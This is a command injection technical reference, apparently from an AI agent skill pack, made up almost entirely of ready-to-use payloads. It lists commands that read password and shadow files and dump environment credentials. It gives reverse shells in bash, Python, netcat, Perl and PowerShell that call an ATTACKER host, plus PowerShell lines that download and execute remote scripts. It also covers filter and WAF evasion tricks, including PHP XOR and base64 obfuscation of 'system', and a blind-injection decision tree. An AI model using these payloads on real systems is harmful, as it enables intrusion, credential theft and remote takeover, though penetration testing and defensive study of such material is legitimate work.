# cmdi-command-injection technical reference

For other original section numbers, use the [entry index](../SKILL.md#references).

## 5. PAYLOAD LIBRARY

### Information Gathering
```bash
; id                          # current user
; whoami                      # user name
; uname -a                    # OS info
; cat /etc/passwd             # user list
; cat /etc/shadow             # password hashes (if root)
; ls /home/                   # home directories
; env                         # environment variables (DB creds, API keys!)
; printenv                    # same
; cat /proc/1/environ         # process environment
; ifconfig                    # network interfaces
; cat /etc/hosts              # host entries
```

### Reverse Shells (Linux)
```bash
# Bash:
; bash -i >& /dev/tcp/ATTACKER/4444 0>&1
; bash -c 'bash -i >& /dev/tcp/ATTACKER/4444 0>&1'

# Python:
; python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("ATTACKER",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'

# Netcat (with -e):
; nc ATTACKER 4444 -e /bin/bash

# Netcat (without -e / OpenBSD):
; rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ATTACKER 4444 >/tmp/f

# Perl:
; perl -e 'use Socket;$i="ATTACKER";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

### Reverse Shells (Windows via PowerShell)
```powershell
& powershell -NoP -NonI -W Hidden -Exec Bypass -c "IEX (New-Object Net.WebClient).DownloadString('http://ATTACKER/shell.ps1')"

& powershell -c "$client = New-Object System.Net.Sockets.TCPClient('ATTACKER',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

---

## 6. FILTER BYPASS TECHNIQUES

### Space Alternatives (when space is filtered)
```bash
cat</etc/passwd          # < instead of space
{cat,/etc/passwd}        # brace expansion
cat$IFS/etc/passwd       # $IFS variable (field separator)
X=$'\x20'&&cat${X}/etc/passwd  # hex encoded space
```

### Slash Alternatives (when `/` is filtered)
```bash
$'\057'etc$'\057'passwd  # octal representation
cat /???/???sec???        # glob expansion
```

### Keyword Bypass via Variable Assembly
```bash
a=c;b=at;c=/etc/passwd; $a$b $c   # 'cat /etc/passwd'
c=at;ca$c /etc/passwd              # cat
```

### Newline Injection
```
cmd%0Aid%0Awhoami          # URL-encoded newlines
cmd$'\n'id$'\n'whoami      # literal newlines
```

---

## 7. COMMON INJECTION ENTRY POINTS

| Entry | Example |
|---|---|
| Network tools | ping, nslookup, traceroute, whois forms |
| File conversion | image resize, PDF generate, format convert |
| Email senders | From address, name fields in notification emails |
| Search/sort parameters | Passed to grep, find, sort commands |
| Log viewing | Passed to tail, grep commands |
| Custom script execution | "Run test" features, CI/CD hooks |
| DNS lookup features | rDNS lookup, WHOIS query |
| Backup/restore features | File path parameters |
| Archive processing | zip/unzip, tar with user-provided filename |

---

## 8. BLIND INJECTION DECISION TREE

```
Found potential injection point?
├── Try basic: ; sleep 5
│   └── Response delays? → Confirmed blind injection
│       ├── Extract data via timing: if/then sleep
│       └── Use OOB: curl/nslookup to Collaborator
│
├── No delay observed?
│   ├── Try: | sleep 5
│   ├── Try: $(sleep 5)
│   ├── Try: ` sleep 5 `
│   ├── Try after URL encoding: %3B%20sleep%205
│   └── Try double encoding: %253B%2520sleep%25205
│
└── All blocked → check WEB APPLICATION LAYER
    Filter on input? → encode differently
    Filter on specific commands? → whitespace bypass, $IFS, glob
```

---

## 9. ADVANCED WAF BYPASS TECHNIQUES

### Wildcard Expansion

```bash
# Use ? and * to bypass keyword filters:
/???/??t /???/p??s??    # /bin/cat /etc/passwd
/???/???/????2 *.php     # /usr/bin/find2 *.php (approximate)

# Globbing for specific files:
cat /e?c/p?sswd
cat /e*c/p*d
```

### cat Alternatives (when "cat" is filtered)

```bash
tac /etc/passwd          # reverse cat
nl /etc/passwd           # numbered lines
head /etc/passwd
tail /etc/passwd
more /etc/passwd
less /etc/passwd
sort /etc/passwd
uniq /etc/passwd
rev /etc/passwd | rev
xxd /etc/passwd
strings /etc/passwd
od -c /etc/passwd
base64 /etc/passwd       # then decode offline
```

### Comment Insertion (PHP specific)

```bash
# Insert comments within function names to bypass WAF:
sys/*x*/tem('id')        # PHP ignores /* */ in some eval contexts
# Note: this works with eval() and similar PHP dynamic calls
```

### XOR String Construction (PHP)

```php
# Build function names from XOR of printable characters:
$_=('%01'^'`').('%13'^'`').('%13'^'`').('%05'^'`').('%12'^'`').('%14'^'`');
# Produces: "assert"
$_('%13%19%13%14%05%0d'|'%60%60%60%60%60%60');
# Evaluates: assert("system")
```

### Base64/ROT13 Encoding

```php
# Encode payload, decode at runtime:
base64_decode('c3lzdGVt')('id');     # system('id')
str_rot13('flfgrz')('id');           # system → flfgrz via ROT13
```

### chr() Assembly

```php
# Build strings character by character:
chr(115).chr(121).chr(115).chr(116).chr(101).chr(109)  # "system"
```

### Dollar-Sign Variable Tricks

```bash
# $IFS (Internal Field Separator) as space:
cat$IFS/etc/passwd
cat${IFS}/etc/passwd

# Unset variables expand to empty:
c${x}at /etc/passwd      # $x is unset → "cat"
```

---

